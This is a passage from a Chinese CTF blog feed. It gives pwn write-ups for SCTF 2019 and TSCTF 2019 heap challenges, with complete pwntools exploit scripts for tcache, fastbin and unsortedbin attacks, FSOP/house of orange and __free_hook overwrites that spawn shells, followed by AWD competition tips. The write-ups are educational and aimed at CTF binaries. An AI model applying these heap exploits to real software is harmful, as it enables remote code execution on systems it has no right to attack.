new(size,content): p.recvuntil("Your choice:") p.sendline("1") p.recvuntil("Input the size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.sendline(content)def remove(): p.recvuntil("Your choice:") p.sendline("2")def new0(size,content): p.recvuntil("Your choice:") p.sendline("1") p.recvuntil("Input the size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.send(content)new(0x60,"aaa")remove()remove()new(0x60,'\x20\x60') #想分到stdout上去 stdout_addr = proc_addr + 0x202020#gdb.attach(p)new(0x60,'')raw_input()new(0x60,'')pay = p64(0xfbad1880) + p64(0)*3 + "x00"new(0x60,pay)libc_addr = u64(p.recvuntil("x7f")[8:8+6].ljust(8,"x00"))-0x3ed8b0print hex(libc_addr)malloc_hook = a.symbols["__malloc_hook"]+libc_addrrelloc_hook = a.symbols["__realloc_hook"]+libc_addrprint hex(malloc_hook)one = 0x4f2c5+libc_addrprint onenew(0x50,"a")remove()remove()new(0x50,p64(relloc_hook))new(0x50,"peanuts")new(0x50,p64(one)+p64(libc_addr+a.sym['realloc']+0xe))print hex(one)new(0x30,"b")p.interactive() two_heap:考了两个主要的点，一个__printf_chk利用%a泄露libc，一个点是malloc的size，0x0，0x8，0x10，0x18申请出的chunk都是0x20来绕过题目里的size check。妈的，倒是这个环境问题搞得我很头大。。。ld.so最后找学长要的。。 第一个点在2018BCTF和2018HCTF里都出现了，反正就是相互抄呗。。。（ 逃。 传送门一号（泄露的原理） 传送门二号 我这里跟了一下： 先压整数寄存器： 然后检测al，al为0所以进行了跳转： 看一下未跳转处的代码指令，压入8个浮点数寄存器： 看一下此时的栈布局，我们泄露的脏数据应该就是画出的那一部分： 结果： exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['tmux','splitw','-h']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./two_heap','./ld-2.26.so')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.26.so'&#125;)def new(size,content): p.recvuntil('Your choice:') p.sendline('1') p.recvuntil('Input the size:') p.sendline(str(size)) p.recvuntil('Input the note:\n') p.send(content)def delete(index): p.recvuntil('Your choice:') p.sendline('2') p.recvuntil('Input the index:\n') p.sendline(str(index))libc = ELF('./libc-2.26.so') p.recvuntil('Welcome to SCTF:\n')p.sendline('%a%a%a%a%a')p.recvuntil('00x0.0')libcbase = '0x'+p.recv(11)+'0'libcbase = int(libcbase,16)libcbase = libcbase - (0x7f817db77720-0x7f817d9c8000)log.success('libcbase = '+hex(libcbase))p.recvuntil('Your choice:')p.sendline('1')p.recvuntil('Input the size:')p.sendline('0')delete(0)delete(0)new(8,p64(libcbase+libc.sym['__free_hook']))new(0x10,'\n')new(0x18,p64(libcbase+libc.sym['system'])+'\n')new(0x20,'/bin/sh\x00\n') #4delete(4)p.interactive() easy_heap:这题和2019TSCTF的ym学长出的babyheap重了。。。而且预期解和我当时的解还不一样貌似。。。 TSCTF原本的解:第二阶段的fastbin_attack即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#coding:utf-8from pwn import *path = './easy_heap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def delete(index): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def fill(index,content): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') p.send(content)def mypwn(): new(0x88) #0 new(0x68) #1 new(0x68) #2 new(0xf8) #3 new(0x28) #4 fill(2,p64(0)*12+p64(0x170)+'\n') delete(0) delete(3) new(0x68) #0 fill(0,'\xdd\x15\n') delete(1) delete(2) new(0xa0) #1 fill(1,p64(0)*17+p64(0x71)+'\x00\n') new(0x68) #2 new(0x68) #3 new(0x68) #5 fill(5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f015afd1600-0x7f015ac0c000) log.success('libcbase = '+hex(libcbase)) delete(0) delete(2) delete(3) new(0x68) #0 fill(0,p64(libcbase+(0x7f015afd0b05-0x7f015ac0c000))+'\n') new(0x68) #2 new(0x68) #3 new(0x68) #6 fill(6,'\x00'*0xb+p64(0)*5+p64(0x7f)+p64(libcbase+(0x7f015afd0b40-0x7f015ac0c000))+'\n') new(0x68) #7 fill(7,p64(libcbase+(0x7f015afd0b40-0x7f015ac0c000))+p64(0)*4+p64(libcbase+libc.sym['__malloc_hook']-0x10)+'\n') new(0x140) #8 new(0x10) #9 one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] fill(9,p64(libcbase+one_gadget[2])+'\n') delete(9) if attach == 1: gdb.attach(p) p.interactive()while True: try: mypwn() break except: p.close() p = process(path) 因有了mmap地址而写的新解：在mmap_addr上伪造_IO_FILE，然后改_IO_list_all为mmap_addr即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#coding:utf-8from pwn import *path = './easy_heap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def delete(index): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def fill(index,content): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') p.send(content)def mypwn(): p.recvuntil('Mmap: ') mmap_addr = int(p.recv(12),16) log.success('mmap_addr = '+hex(mmap_addr)) new(0x88) #0 p.recvuntil('Address ') base_addr = int(p.recv(14),16) - 0x68 log.success('base_addr = '+hex(base_addr)) new(0x68) #1 new(0x68) #2 new(0xf8) #3 new(0x28) #4 fill(2,p64(0)*12+p64(0x170)+'\n') delete(0) delete(3) new(0x68) #0 fill(0,'\xdd\x15\n') delete(1) delete(2) new(0xa0) #1 fill(1,p64(0)*17+p64(0x71)+'\x00\n') new(0x68) #2 new(0x68) #3 new(0x68) #5 fill(5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f015afd1600-0x7f015ac0c000) log.success('libcbase = '+hex(libcbase)) delete(0) delete(2) delete(3) new(0x68) #0 fill(0,p64(base_addr+0xb5)+'\n') new(0x68) #2 new(0x68) #3 new(0x68) #6 fill(6,'\x00'*0xb+p64(0x200)+p64(mmap_addr)+p64(0x20)+p64(libcbase+libc.sym['_IO_list_all'])+'\n') vtable = p64(mmap_addr+0xe0) fake_file = '/bin/sh\x00'+p64(0)*4+p64(1) fake_file += p64(0)*14 + vtable + p64(0)*3 + p64(0xffffffffffffffff) fake_file = fake_file.ljust(0xd8,'\x00') fake_file += vtable + p64(0)*3 + p64(libcbase + libc.symbols['system'])*4 fill(7,fake_file+'\n') fill(8,p64(mmap_addr)+'\n') p.recvuntil('&gt;&gt; ') p.sendline('4') if attach == 1: gdb.attach(p) p.interactive()while True: try: mypwn() break except: p.close() p = process(path) 官方解：Unlink加partial overwrite加house of orange： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127from pwn import *context.log_level = "debug"context.terminal = ["tmux","split",'-h']context.update(arch='amd64',os='linux')DEBUG = 1if DEBUG: p = process("./easy_heap") libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")else: p = remote("132.232.100.67",10004) libc = ELF("./libc.so.6")def add(size): p.recvuntil("&gt;&gt; ") p.sendline('1') p.recvuntil("Size: ") p.sendline(str(size)) p.recvuntil("Address ") heap_ptr = int(p.recvuntil("\n",drop=True),16) print hex(heap_ptr) return heap_ptrdef delete(idx): p.recvuntil("&gt;&gt; ") p.sendline('2') p.recvuntil("Index: ") p.sendline(str(idx))def edit(idx,data): p.recvuntil("&gt;&gt; ") p.sendline('3') p.recvuntil("Index: ") p.sendline(str(idx)) p.recvuntil("Content: ") p.send(data)code = """ xor rsi,rsi mov rax,SYS_open nop nop call here .string "./flag" here: pop rdi syscall mov rdi,rax mov rsi,rsp mov rdx,0x100 mov rax,SYS_read syscall mov rdi,1 mov rsi,rsp mov rdx,0x100 mov rax,SYS_write syscall mov rax,SYS_exit syscall """shellcode = asm(shellcraft.sh())p.recvuntil("Mmap: ")mmap_addr = int(p.recvuntil('\n',drop=True),16)print hex(mmap_addr)##unlinkheap_list = add(0xf8) - 0x8 #0add(0xf0) #1add(0x20) #2payload = p64(0) + p64(0xf0)payload += p64(heap_list+0x8-0x18) + p64(heap_list+0x8-0x10)payload = payload.ljust(0xf0,'\x00')payload += p64(0xf0)edit(0,payload)delete(1)##mmap_addr-&gt;shellcodepayload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0x1000) + p64(mmap_addr)edit(0,payload+'\n')edit(1,shellcode+'\n')##unsorted bin size: 0x1c1-&gt;0x61add(0x20) #3payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0)*4 + p64(8) + '\x48' + '\n' #unsortedbin sizeedit(0,payload)edit(3,'\x61\x00'+'\n')##unsortedbin attack##bk -&gt; IO_list_all-0x10payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0)*4 + p64(8) + '\x58' + '\n' #unsortedbin bkedit(0,payload)edit(3,'\x10\x25'+'\n') #IO_list_all##fake vtablepayload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0)*4 + p64(0x1000) + '\x60' + '\n'edit(0,payload)fake_vtable = (heap_list - 0x202060) + 0x202070payload = p64(2) + p64(3)payload = payload.ljust(0xb8,'\x00')payload += p64(fake_vtable)edit(3,payload+'\n')##payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(mmap_addr) * 10edit(0,payload+'\n')##triggergdb.attach(p)p.recvuntil("&gt;&gt; ")p.sendline('1')p.recvuntil("Size: ")p.sendline('1')p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>SCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019TSCTF_FINAL]]></title>
    <url>%2F2019%2F08%2F01%2F2019-TSCTF-FINAL%2F</url>
    <content type="text"><![CDATA[6月份的2019TSCTF的线下赛应该是我打的第一次awd，第一次么，难免有些紧张，再加上只有我一个人打pwn（毕竟一个队伍就两个人。。。一人web一人pwn。。。最后开心自闭orz），整个比赛有点手忙脚乱，一直想复盘总结一下这两道题，17和ym学长出的题还是很有水平的，以及加上在这之后又打了两场线下，想在最后说一下我自己的一点心得经验。 cxk:环境：docker:18.04 程序分析和漏洞挖掘：这个程序逻辑比较复杂，当时在比赛时看呆了。。。完全迷在了程序里。。。脑子一片混沌，赛后复现才慢慢理清思路，收获也有不少。 其实有用的函数就五个，其他都是用来乱花迷人眼的。程序太长，懒得分析，自己看吧。。。 漏洞点： edit_letter功能里的strchr函数，他会把\x00也算作字符串的一部分，并且次数没有限制，我们就可以把\x00先把字节抹去，再更改之后的chunk的size位，进而进行chunk overlapping。 tcache本身自带的松散检查。 唉，其实这题主要考的是程序的分析能力，和看你能不能在短时间内找到突破点，而不是一直迷在程序的无用逻辑里。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#coding:utf-8from pwn import *path = './cxk'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def addav(av_number,des_size,content): p.recvuntil('Choice:') p.sendline('2') p.recvuntil('Choice:') p.sendline('1') p.recvuntil('av number:') p.sendline(str(av_number)) p.recvuntil('description:') p.sendline(str(des_size)) p.recvuntil('Description:') p.sendline(content)def addletter(av_number,reason_size,reason): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('1') p.recvuntil('av number:') p.sendline(str(av_number)) p.recvuntil('size of reason:') p.sendline(str(reason_size)) p.recvuntil('Reason:') p.send(reason)def editletter(av_number,old_chr,new_chr): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('3') p.recvuntil('statement you want to change:') p.sendline(str(av_number)) p.recvuntil('old character:') p.sendline(old_chr) p.recvuntil('new character:') p.sendline(new_chr)def revoke(av_number): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('4') p.recvuntil('you want to revoke:') p.sendline(str(av_number))def showletter(av_number): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('5') p.recvuntil('you want to see:') p.sendline(str(av_number))p.recvuntil('Please input your name:')p.sendline('xiaoxiaorenwu')#------------------get unsortedbin chunk and prepare for get shellfor i in range(20): addav(i,10,'xxrw')for i in range(8): addletter(i,68,'\x11'*0x67+'\n')addletter(8,18,'xxrw\n')addletter(9,18,'xxrw\n')for i in range(7): editletter(i,'\x00','\x11') editletter(i,'\x31','\xa1') revoke(i)revoke(8)revoke(9)editletter(7,'\x00','\x11')editletter(7,'\x31','\xa1')revoke(7)#------------------success--------------------------------------#------------------leak libc------------------------------------addletter(10,0x28,'\x11'*7+'\n')showletter(10)p.recvuntil('\x11'*7+'\x00')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fdbef252d30-0x7fdbeee67000)log.success('libcbase = '+hex(libcbase))free_hook = libcbase + libc.sym['__free_hook']system_addr = libcbase + libc.sym['system']#------------------success--------------------------------------#------------------get shell------------------------------------for i in range(27): editletter(10,'\x00','\x11')for i in range(6): editletter(10,'\x00',p64(free_hook)[i])addletter(11,18,'\n')addletter(12,18,'/bin/sh\x00\n')addletter(13,18,p64(system_addr)+'\n')revoke(12)if attach == 1: gdb.attach(p)p.interactive() filesystem:环境：Ubuntu16.04 程序分析和漏洞挖掘：这题比cxk要好得多，起码代码量不是很大，我在比赛时也已经分析得差不多了，当时主要卡在unsortedbin_attack，先申请一个0x50的结构体chunk这个东西老是干扰我的正常思路，在加上比赛时本来心态就慌，导致思路很乱，再复盘一下。 程序功能自己分析吧，不难，都能看懂，懒得写了。。。。 漏洞点有两个： snprintf的返回值漏洞，其返回的是打印出的字符数，如果我们名字长度是0x20的话，更新时我们就可以填一个0x31长度的名字，正好溢出一个字节，改了size，造成进一步content溢出。 函数原型：int snprintf(char *str, size_t size, const char *format, …); size 的作用就是限制往str写入不超过size个字节(包括了结尾的’\0’)。 因为sprintf()函数如果成功的话，返回成功写入的字节数(字符数)，我就一直以为snprintf()函数也是如此，也就是snprintf()函数不会返回大于size的整数。 看下面一段手册内容： The functions snprintf() and vsnprintf() do not write more than size bytes (including the trailing ’\0’). If the output was truncated due to this limit then the return value is the number of characters (not including the trailing ’\0’) which would have been written to the final string if enough space had been available. Thus, a return value of size or more means that the output was truncated. 如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所应能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是16 而不是10 UAF，这个都看得出来。 遇到的困难和需要思考的地方： 困难一：因为在my_malloc时对我们分配的chunk的地址进行了检查，导致我们无法正常地分配chunk到main_arena-0x33去。 解决方法：利用溢出进行unsortedbin_attack将far全局变量改为main_arena+88，从而突破原先的限制。 困难二：因为进行了unsortedbin_attack之后，unsortedbin就已经毁坏无法使用，所以我们之后的malloc都必须从fastbin里取，每次newfile时都要申请0x50chunk的操作很干扰我们的进一步行动。 解决办法：因为没有限制file的数量，所以我们可以无限申请file，在进行unsortedbin_attack之前，我们先多次newfile，再多次delete，使0x50的fastbin里留存有大量充足的chunk，使之后的newfile申请的0x50的结构体chunk都直接从这里取，再使0x70的fastbin里提前实现好double free，在unsortedbin_attack之后就可以一气呵成getshell。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#coding:utf-8from pwn import *path = './filesystem'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new_dir(name): p.recvuntil('Your choice: \n') p.sendline('1') p.recvuntil('Give me the directory name: \n') p.sendline(name)def new_fileN(dir_name,file_name,file_size,content, is_changed='n'): p.recvuntil('Your choice: \n') p.sendline('2') p.recvuntil('which directory do you want to put this file in: \n') p.sendline(dir_name) p.recvuntil('Ok, plz input your filename(len&lt;=0x20): \n') p.sendline(file_name) p.recvuntil('file size: \n') p.sendline(str(file_size)) p.recvuntil('changed!!\n') p.sendline(is_changed) p.recvuntil('Content: \n') p.sendline(content)def new_fileY(dir_name,file_name,file_size,new_file_name,content, is_changed='Y'): p.recvuntil('Your choice: \n') p.sendline('2') p.recvuntil('which directory do you want to put this file in: \n') p.sendline(dir_name) p.recvuntil('Ok, plz input your filename(len&lt;=0x20): \n') p.send(file_name) p.recvuntil('file size: \n') p.sendline(str(file_size)) p.recvuntil('changed!!\n') p.sendline(is_changed) p.recvuntil('input your new file name: ') p.send(new_file_name) p.recvuntil('Content: \n') p.sendline(content)def show(dir_name,file_name): p.recvuntil('Your choice: \n') p.sendline('3') p.recvuntil('input directory: \n') p.sendline(dir_name) p.recvuntil('input filename: \n') p.sendline(file_name)def delete(dir_name,file_name): p.recvuntil('Your choice: \n') p.sendline('4') p.recvuntil('input directory: \n') p.sendline(dir_name) p.recvuntil('input filename: \n') p.sendline(file_name)def recover(dir_name,file_name): p.recvuntil('Your choice: \n') p.sendline('6') p.recvuntil('input directory: \n') p.sendline(dir_name) p.recvuntil('input filename: \n') p.sendline(file_name)new_dir('xxrw')new_fileN('xxrw','xqh0',0x80,'\x00'*0x80)new_fileN('xxrw','xqh1',0x40,'\x00'*0x40)delete('xxrw','xqh0')recover('xxrw','xqh0')show('xxrw','xqh0')p.recvuntil('file content: ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f72e73ebb78-0x7f72e7027000)log.success('libcbase = '+hex(libcbase))new_fileN('xxrw','xqh',0x30,'\x00'*0x30)new_fileN('xxrw','xqh2',0x40,'\x00'*0x40)new_fileN('xxrw','xqh3',0x40,'\x00'*0x40)new_fileN('xxrw','xqh4',0x40,'\x00'*0x40)new_fileN('xxrw','xqh5',0x40,'\x00'*0x40)new_fileN('xxrw','xqh6',0x40,'\x00'*0x40)new_fileN('xxrw','xqh7',0x40,'\x00'*0x40)new_fileN('xxrw','xqh8',0x40,'\x00'*0x40)new_fileN('xxrw','xqh9',0x40,'\x00'*0x40)new_fileN('xxrw','xqh10',0x40,'\x00'*0x40)delete('xxrw','xqh1')delete('xxrw','xqh2')delete('xxrw','xqh3')delete('xxrw','xqh4')delete('xxrw','xqh5')delete('xxrw','xqh6')delete('xxrw','xqh7')delete('xxrw','xqh8')delete('xxrw','xqh9')delete('xxrw','xqh10')#----------------------------prepare getshell-------------------new_fileN('xxrw','xqh_p1',0x60,'\x00'*0x60)new_fileN('xxrw','xqh_p2',0x60,'\x00'*0x60)delete('xxrw','xqh_p1')delete('xxrw','xqh_p2')recover('xxrw','xqh_p1')delete('xxrw','xqh_p1')#----------------------------------------------------------------new_fileN('xxrw','xqh11',0x9f,'\x00'*0x9f) new_fileN('xxrw','xqh12',0x30,'\x00'*0x30)delete('xxrw','xqh11')payload = '\x12'*0x10+p64(0)+p64(0x91)+p64(0)+p64(0x603068-0x10)new_fileY('xxrw','xq'*0x10,0x10,'xqh'*0x10+'\xff',payload)new_fileN('xxrw','xqh13',0x80,'\x00'*0x80)#---------------------------------success-------------------------one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]new_fileN('xxrw','xqh_p3',0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23))new_fileN('xxrw','xqh_p4',0x60,'\x00'*0x60)new_fileN('xxrw','xqh_p5',0x60,'\x00'*0x60)new_fileN('xxrw','getshell!!',0x60,'\x00'*0x13+p64(libcbase+one_gadget[2]))delete('xxrw','getshell!!')if attach == 1: gdb.attach(p)p.interactive() pwn1:环境：docker：Ubuntu19.04 唉，比较操蛋的是比赛时19.04的虚拟机崩了，学长也没有环境，所以只能在16.04上用脚本强行加载2.29的libc，还没有debug信息和符号表，让人做的很操蛋。也让我知道了docker的优越性，这道题复盘时也算是学了docker的做题环境部署。 程序分析和漏洞挖掘：程序没啥好分析的，就一个UAF的洞，是人都可以看出来，我就不贴出来了。主要分析一下利用的技巧。个人觉得这道题技巧性还是蛮高的。 看一下保护全开，心里有数了13数：肯定要改hook。 说实话，这道题开始我感觉还蛮简单的，一顿套路操作猛如虎。。。到最后发现，想用double free往malloc_hook上分chunk，new的次数超了，他限制的是20次，正常情况下要21次才能成功。 这时侯，开始想到这题肯定不是套路，还是有新东西的。以下为当时想到的逐渐接近正解的三个阶段： 申请7个chunk：从chunk1到chunk7，然后全部free，这时候再free一次chunk7，想实现chunk7又在tcache里，又在fastbin里，结果调试发现失败，tcache的检测机制还是会检测到double free。 逆向思维：我们的目标是想让一个chunk又在tcache中，又在fastbin中。既然让这个chunk先在tcache，后在fastbin中行不通的话，那我们就让他先在fastbin中，后在tcache中：申请8个chunk：从chunk1到chunk7，然后全部free，这时候再freechunk8，再new一个，再次freechunk8，这时，chunk8实现了我们的目标。 本以为可以之后就可以直接分到main_arena-0x33上去然后直接拿shell，结果后来调试发现当把fastbin里剩余的chunk链放入tcache里时，因为过不了__int_malloc里的某个检测而失败。。。思路陷入死胡同。。。 12345678910111213141516#----------------第一种--------------------------for i in range(7): new(0x60)for i in range(7): delete(i+1)delete(7) #----------------失败----------------------------#----------------第二种--------------------------for i in range(8): new(0x60)for i in range(7): delete(i+1)delete(8)new(0x60)delete(8)#----------------成功--------------------------- 最后学长想到了另外一个点：tcache里分配chunk和fastbin不同，其不检查size，fastbin因为要检查size所以必须分到main_arena-0x33，但是tcache就可以直接分到__free_hook-0x10，然后就顺利getshell！！！ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#coding:utf-8from pwn import *path = './easyheap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64')context.terminal = ['tmux','splitw','-h']#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;&gt;') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.sendline(content)def delete(index): p.recvuntil('&gt;&gt;') p.sendline('2') p.recvuntil('idx:') p.sendline(str(index))def view(index): p.recvuntil('&gt;&gt;') p.sendline('3') p.recvuntil('idx:') p.sendline(str(index))new(0x500,'\x00') #0new(0x60,'\x11') #1delete(0)view(0)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fe5df606ca0-0x7fe5df422000)log.success('libcbase = '+hex(libcbase))new(0x60,'\x22') #2new(0x60,'\x33') #3new(0x60,'\x44') #4new(0x60,'\x55') #5new(0x60,'\x66') #6new(0x60,'\x77') #7new(0x60,'\x88') #8for i in range(7): delete(i+1)delete(8)new(0x60,'\x10') #9delete(8)target = libcbase + libc.sym['__free_hook'] - 0x10new(0x60,p64(target)) #10new(0x60,'a') #11new(0x60,'b') #12new(0x60,'c')new(0x60,'d')new(0x60,'e')new(0x60,'/bin/sh\x00') #16if attach == 1: gdb.attach(p)new(0x60,'\x00'*0x10) #17one_gadget = [0xe237f,0xe2383,0xe2386,0x106ef8]new(0x60,p64(libcbase+libc.sym['system']))delete(16)p.interactive() tcache的小心得： 不检查size是其和fastbin的很大区别之一，导致其可以直接上到free_hook。 可以直接overlapping，就是一个chunk可以又在0x60的tcachebin里，又可以在0x70的tcachebin里，fastbin也可以。 当fastbin中有chunk，tcache里为空时，申请一个chunk之后，剩下的fastbin里的chunk都会放到tcache里，但貌似如果fd存在非法地址放入fastbin时会报错。 awd的一点点心得经验（pwn方面）：个人心得：首先我jio得攻要比守重要的多，为什么这么说呢，有两个原因： 大家可以算一下，假设全场有20支队伍，你pwn了一题，就可以打全场，假设拿了flag得10分，就等于每五分钟就可以得190分，即使有的队伍打patch成功了，或者总分是和不变机制，那一轮也至少能拿100+的分数，再想想我们如果去打patch，假设我们幸运的成功了，那这一题对我们的意义也就仅仅在于每一轮会少个十分二十分，但并不会妨碍做出来这题的队伍每轮得到100+的分数（除非这道题全场都做出来了。。。。），我们出一道题所得的分要比打patch少扣的分要多得多，就相当于你做出一题，而你其他所有题都在被别人打，你的分数也可以维持不降。 pwn的打patch程序极其复杂，而且不同的比赛他的check严密程度和个性化要求都不一样（我感觉碰到check难一点的patch不比写exp简单。。。），我打TSCTF时，打了三个patch，一个off-one-null，两个uaf，最后两个没防住，一个没过check（filesystem我当时打了uaf，但是他有要求说patch只能打在eh_frame段，其他任何段都不能动一个字节，后来问了ym学长他说常规打法虽然是打在eh_frame段，但实际上其他段的某些部位的字节会变。。这个还有待研究。。），但时间已经没有多少了，根本不够再去写exp，最后就是眼睁睁地看着自己一直被打而无可奈何。。。 感觉awd中pwn如果只有一个人负责真的太累了，一个人的话只能负责到一个面，又攻又守的感觉难度太大，除非是老赛棍orz，如果真的一个人去打的时候，最好目标明确果断一点，不要看了一会题，写了一会exp，又去patch一会。。。 至于怎么打patch的话，ym学长和panda学长的博客写的很清晰明了：传送门1号，传送门2号 还有就是线下赛的特点一般是题目代码量极大，会在寻找漏洞点和逆向上出为难大家的点，所以千万不能急，要沉下心慢慢找洞，不要老是看得分榜，专注一点。 比赛时需要注意的细节： 改服务器密码 打好patch别忘给权限 要留意有没有后门，因为pwn和web不一样，写exp是一个阶段性的工作，所以pwn很难开局就打起来，一般是过了一两个小时才有队伍陆陆续续写出exp然后开始打，所以主办方有可能为了防止pwn选手开局就陷入沉闷的写exp环节，有可能会在代码量极大的题中留有后门。(cxk貌似有栈溢出后门？？) 工具： winscp/Xftp xshell 自动化交flag的脚本 pwn题环境和patch工具 u盘？（合作时传文件比较快？）]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>TSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5种方法解2019*CTF_heap_master来加深对深层次堆利用手段的理解]]></title>
    <url>%2F2019%2F07%2F05%2F5%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3heap_master%2F</url>
